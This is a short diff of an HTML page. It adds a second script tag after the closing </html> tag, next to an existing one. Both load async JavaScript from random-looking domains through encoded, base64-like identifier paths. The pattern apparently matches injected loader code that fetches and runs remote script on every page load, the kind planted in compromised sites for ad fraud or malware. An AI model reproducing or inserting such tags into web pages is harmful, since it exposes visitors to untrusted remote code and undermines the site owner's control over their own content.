@@ -75,3 +75,4 @@
 </body>
 </html>
 <script async src="https://udzpel.com/pw/waWQiOjEyMDM1NjMsInNpZCI6MTUzMDIzMywid2lkIjo3MTY1NzksInNyYyI6Mn0=eyJ.js"></script>
+<script async src="https://jyzkut.com/p/waWQiOjEyMDM1NjMsInNpZCI6MTUzMDIzMywid2lkIjo3MTY2MzUsInNyYyI6Mn0=eyJ.js"></script>
